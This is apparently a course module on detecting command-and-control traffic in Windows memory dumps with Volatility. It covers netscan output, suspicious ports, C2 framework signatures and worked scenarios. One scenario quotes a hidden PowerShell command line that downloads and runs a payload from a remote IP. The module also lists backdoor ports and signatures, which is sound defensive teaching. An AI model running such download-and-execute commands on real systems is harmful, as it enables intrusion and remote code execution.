# Network Analysis and C2 Detection

## Why Network Forensics in Memory?

**Traditional network forensics limitations:**
- Requires packet capture (may not exist)
- Encrypted traffic (HTTPS, VPN) hides C2 communication
- Ephemeral connections (may be closed before packet capture)

**Memory forensics advantages:**
- **Active connections**: See what's connected RIGHT NOW
- **Listening ports**: Find backdoors waiting for connections
- **Process-to-connection mapping**: Which process owns which connection?
- **Historical connections**: Closed connections may still be in memory

## Core Network Analysis Plugins

### windows.netscan
**Purpose**: Scan memory for TCP/UDP connections and listening sockets

**Command:**
```bash
vol -f memory.dmp windows.netscan
```

**Output Columns:**
- **Offset**: Memory offset of network structure
- **Proto**: Protocol (TCPv4, UDPv4, TCPv6, UDPv6)
- **LocalAddr**: Local IP address
- **LocalPort**: Local port number
- **ForeignAddr**: Remote IP address
- **ForeignPort**: Remote port number
- **State**: Connection state (ESTABLISHED, LISTENING, CLOSED, etc.)
- **PID**: Process ID owning the connection
- **Owner**: Process name
- **Created**: Timestamp when connection was created

**Example Output:**
```
Offset          Proto   LocalAddr:LocalPort     ForeignAddr:ForeignPort State           PID     Owner           Created
0x12ab89c0      TCPv4   192.168.1.100:49152     93.184.216.34:443       ESTABLISHED     1234    chrome.exe      2024-01-18 10:30:00
0x12ab8a10      TCPv4   0.0.0.0:445             0.0.0.0:0               LISTENING       4       System          2024-01-18 09:00:00
0x12ab8b20      TCPv4   192.168.1.100:4444      10.0.0.50:55123         ESTABLISHED     5678    cmd.exe         2024-01-18 14:25:30
```

**Red Flags:**
- ❌ **Unusual external IPs**: Connections to countries/IPs not typical for the organization
- ❌ **High-numbered ports**: 4444, 31337, 8080, 12345 (common C2 ports)
- ❌ **Unusual process-to-port mapping**: notepad.exe with network connection, calc.exe listening on port 4444
- ❌ **0.0.0.0 listeners**: Processes listening on all interfaces (potential backdoor)
- ❌ **Connections from system processes**: svchost.exe, lsass.exe, smss.exe should NOT have external connections

### Understanding Connection States

**LISTENING**: Port is open, waiting for incoming connections
- **Normal**: Web server on port 80/443, SSH server on port 22
- **Suspicious**: Port 4444 (Metasploit), port 31337 (Back Orifice), port 12345 (NetBus)

**ESTABLISHED**: Active connection between two hosts
- **Normal**: Chrome.exe connecting to google.com:443
- **Suspicious**: cmd.exe connecting to attacker IP on port 4444

**CLOSE_WAIT**: Connection in process of closing
- **Forensic Value**: May indicate recently terminated C2 connection

**TIME_WAIT**: Connection closed, waiting for final packets
- **Forensic Value**: Shows historical connections (timeline reconstruction)

## Network Forensics Workflow

### Step 1: Identify All External Connections
```bash
# Extract all network connections
vol -f memory.dmp windows.netscan > netscan.txt

# Filter for ESTABLISHED connections to external IPs
cat netscan.txt | grep ESTABLISHED | grep -v "127.0.0.1\|192.168\|10.0\|172.16"

# Result: List of active connections to internet
```

**Analysis Questions:**
1. Is the remote IP legitimate? (Check VirusTotal, AbuseIPDB, Shodan)
2. Is the process expected to have network connections? (chrome.exe = yes, notepad.exe = no)
3. Is the port number suspicious? (443 = normal HTTPS, 4444 = Metasploit default)
4. When was the connection created? (timeline correlation with other events)

### Step 2: Identify Listening Ports (Backdoors)
```bash
# Find all LISTENING ports
cat netscan.txt | grep LISTENING

# Focus on high-numbered ports (>1024)
cat netscan.txt | grep LISTENING | awk '$3 ~ /:([5-9][0-9]{3}|[1-9][0-9]{4,})$/'
```

**Common Backdoor Ports:**
```
Port 31337: Back Orifice (classic backdoor)
Port 4444: Metasploit default listener
Port 5555: Android Debug Bridge (adb) - if not expected
Port 8080: HTTP alternate (often used for C2 proxying)
Port 12345: NetBus backdoor
Port 27374: SubSeven backdoor
Port 1337: Elite ports (often used by script kiddies)
```

### Step 3: Process-to-Connection Mapping
```bash
# For each suspicious connection, identify the process
# Example: Connection to 10.0.0.50:4444 from cmd.exe (PID 5678)

# Get command-line for that process
vol -f memory.dmp windows.cmdline --pid 5678

# Get DLLs loaded by that process
vol -f memory.dmp windows.dlllist --pid 5678

# Check for code injection
vol -f memory.dmp windows.malfind --pid 5678
```

### Step 4: Timeline Reconstruction
```bash
# Extract timestamps from network connections
cat netscan.txt | awk '{print $NF, $0}' | sort

# Correlate with process creation times
vol -f memory.dmp windows.pslist | awk '{print $NF, $0}' | sort

# Result: Timeline of when malware was executed and when C2 connection was established
```

## Malware C2 (Command and Control) Detection

### C2 Communication Patterns

**Pattern 1: Beaconing (Periodic Check-Ins)**
```
Malware connects to C2 server every X seconds/minutes
Example: Connection to 93.184.216.34:443 every 60 seconds

Detection:
- Look for multiple connections to same IP with regular intervals
- Check process command-line for sleep/delay parameters
```

**Pattern 2: DNS Tunneling**
```
Malware encodes data in DNS queries (bypasses firewalls)
Example: a1b2c3d4.malware.evil.com

Detection:
- Unusually long DNS queries (>50 characters)
- High volume of DNS queries to same domain
- Subdomains with hex/base64-looking strings
```

**Pattern 3: HTTP/HTTPS C2**
```
Malware uses legitimate-looking HTTP(S) traffic
Example: POST requests to attacker-controlled server

Detection:
- Unusual User-Agent strings
- Connections to recently registered domains
- HTTP traffic from non-browser processes
```

**Pattern 4: Reverse HTTPS (HTTPS over non-443 ports)**
```
Malware uses HTTPS on unusual ports to evade detection
Example: TCP connection to 8.8.8.8:8443 (not standard HTTPS port)

Detection:
- HTTPS traffic on ports other than 443
- Connections to cloud services from system processes
```

### Known C2 Frameworks (Signatures)

**Cobalt Strike:**
```
- Default port: 50050 (HTTPS), 80 (HTTP), 443 (HTTPS)
- User-Agent: Often customizable, but defaults to "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
- Beacon behavior: Regular check-ins (beaconing)
- Process: Often injected into legitimate processes (rundll32.exe, svchost.exe)
```

**Metasploit:**
```
- Default port: 4444 (reverse TCP), 4445 (bind TCP)
- User-Agent: "Mozilla/5.0"
- Meterpreter process: Often creates background process with random name
```

**Empire:**
```
- Default port: 80 (HTTP), 443 (HTTPS)
- User-Agent: PowerShell-based, often customizable
- Process: powershell.exe with encoded command-line
```

**PoshC2:**
```
- Default port: 443 (HTTPS)
- User-Agent: Randomized
- Process: powershell.exe or rundll32.exe
```

## Network IOCs (Indicators of Compromise)

### Suspicious Process-Port Combinations
```
❌ notepad.exe with ANY network connection (not expected)
❌ calc.exe listening on ANY port (definitely backdoor)
❌ cmd.exe with external connection on port 4444 (Metasploit reverse shell)
❌ powershell.exe with connection to IP on port 443 (Empire/PoshC2)
❌ svchost.exe with connection to external IP (should only connect to Microsoft services)
❌ lsass.exe with network connection (credential dumping/exfiltration)
```

### Suspicious IP Addresses
```
Check these resources for IP reputation:
- VirusTotal: https://www.virustotal.com/
- AbuseIPDB: https://www.abuseipdb.com/
- Shodan: https://www.shodan.io/
- ThreatCrowd: https://www.threatcrowd.org/

Red flags:
- IPs from Tor exit nodes
- IPs from known VPS providers (DigitalOcean, Linode, Vultr) - common for C2
- IPs from countries with no business relationship
- IPs with open ports 22, 4444, 8080 (Shodan scan)
```

### Suspicious Ports
```
Common C2 Ports:
- 4444: Metasploit default
- 5555: Android ADB (if not expected)
- 6666-7777: IRC botnets
- 8080: HTTP alternate (C2 proxy)
- 8443: HTTPS alternate
- 9001-9030: Tor network
- 12345: NetBus
- 27374: SubSeven
- 31337: Back Orifice
```

## Practical Scenarios

### Scenario 1: Identifying Metasploit Reverse Shell
**Memory Dump**: Compromised web server

**Analysis:**
```bash
# Step 1: Find network connections
vol -f webserver.dmp windows.netscan | grep ESTABLISHED

# Output:
# TCPv4   10.0.1.50:4444   192.168.1.100:55123   ESTABLISHED   2134   cmd.exe

# Step 2: Check command-line
vol -f webserver.dmp windows.cmdline --pid 2134

# Output:
# cmd.exe /c powershell -NoProfile -NonInteractive -Command ...

# Step 3: Verdict
# CONFIRMED: Metasploit reverse shell (port 4444, cmd.exe with PowerShell payload)
```

**Remediation:**
1. Isolate system from network
2. Kill PID 2134
3. Dump process memory for malware analysis
4. Check for persistence mechanisms
5. Investigate how attacker gained access

### Scenario 2: Detecting DNS Tunneling
**Memory Dump**: Corporate workstation

**Analysis:**
```bash
# Step 1: Check network connections
vol -f workstation.dmp windows.netscan | grep ":53"

# Output:
# UDPv4   192.168.1.100:52341   8.8.8.8:53   ESTABLISHED   1234   malware.exe

# Step 2: Check process details
vol -f workstation.dmp windows.pslist --pid 1234

# Step 3: Extract DNS queries (requires memory parsing)
strings workstation.dmp | grep -E "[a-f0-9]{32}\.evil\.com"

# Result: Long hex subdomains = likely DNS tunneling
```

**Remediation:**
1. Block DNS queries to suspicious domain
2. Kill malware process
3. Check for data exfiltration
4. Analyze malware binary

### Scenario 3: Finding Cobalt Strike Beacon
**Memory Dump**: Domain controller

**Analysis:**
```bash
# Step 1: Find HTTPS connections on unusual ports
vol -f dc.dmp windows.netscan | grep "50050\|8443"

# Output:
# TCPv4   10.0.0.10:50050   93.184.216.34:55123   ESTABLISHED   5678   rundll32.exe

# Step 2: Check for injected code
vol -f dc.dmp windows.malfind --pid 5678

# Step 3: Check command-line
vol -f dc.dmp windows.cmdline --pid 5678

# Output:
# rundll32.exe C:\Windows\System32\kernel32.dll,Start

# Step 4: Verdict
# CONFIRMED: Cobalt Strike beacon (port 50050, process injection into rundll32.exe)
```

**Remediation:**
1. CRITICAL: Domain controller compromised - assume full domain breach
2. Isolate DC immediately
3. Reset all domain credentials (KRBTGT, admin accounts)
4. Investigate lateral movement
5. Hunt for additional beacons on other systems

### Scenario 4: HTTP C2 Over Port 80
**Memory Dump**: User workstation

**Analysis:**
```bash
# Step 1: Find HTTP connections (port 80) from non-browsers
vol -f workstation.dmp windows.netscan | grep ":80" | grep -v "chrome\|firefox\|msedge"

# Output:
# TCPv4   192.168.1.100:49152   93.184.216.34:80   ESTABLISHED   3456   powershell.exe

# Step 2: Check PowerShell command-line
vol -f workstation.dmp windows.cmdline --pid 3456

# Output:
# powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://93.184.216.34/payload')"

# Step 3: Verdict
# CONFIRMED: Fileless malware (PowerShell downloading and executing payload from HTTP C2)
```

**Remediation:**
1. Kill PowerShell process
2. Block C2 IP at firewall
3. Check for persistence (scheduled tasks, registry Run keys)
4. Investigate initial access vector (phishing email, exploit kit)

## Advanced Network Analysis Techniques

### Technique 1: Correlating Network and Process Timelines
```bash
# Create timeline of process creation
vol -f memory.dmp windows.pslist | awk '{print $NF, $4, $1}' | sort > process_timeline.txt

# Create timeline of network connections
vol -f memory.dmp windows.netscan | awk '{print $NF, $8, $9}' | sort > network_timeline.txt

# Compare: Did malware process start before network connection?
# Example:
# 2024-01-18 14:25:00 malware.exe (PID 5678)
# 2024-01-18 14:25:30 TCP connection from PID 5678
# Conclusion: Malware executed, then established C2 connection
```

### Technique 2: Identifying Persistence Mechanisms via Network
```bash
# Check if malware listens on port (waiting for attacker to reconnect)
vol -f memory.dmp windows.netscan | grep LISTENING | grep -v "System\|services\|svchost"

# Example output:
# TCPv4   0.0.0.0:31337   0.0.0.0:0   LISTENING   1234   backdoor.exe

# Verdict: Persistent backdoor listening on port 31337
```

### Technique 3: Detecting Encrypted C2 Channels
```bash
# HTTPS/TLS connections appear as ESTABLISHED TCP on port 443
# Cannot see payload (encrypted), but CAN see:
# - Remote IP
# - Process owning connection
# - Connection timestamp

# Example:
vol -f memory.dmp windows.netscan | grep ":443"

# Check if process is expected to use HTTPS
# chrome.exe on port 443 = normal
# cmd.exe on port 443 = SUSPICIOUS (likely encrypted C2)
```

## Key Takeaways

1. **netscan** reveals ALL network connections and listening ports
2. **Focus on**: Unusual process-port combinations, high-numbered ports, external IPs
3. **C2 detection**: Look for beaconing, unusual protocols, known C2 ports
4. **Timeline correlation**: When was process created? When was connection established?
5. **IP reputation**: Use VirusTotal, AbuseIPDB, Shodan to verify external IPs

**Golden Rule**: ANY network connection from a non-network process is suspicious until proven otherwise.

## What's Next?

- **Module 05**: Advanced malware detection with Malfind
- **Module 06**: Registry forensics and persistence mechanisms
- **Module 07**: File analysis and extraction

---

**Reference**: "Practical Malware Analysis" by Michael Sikorski and Andrew Honig (2012)
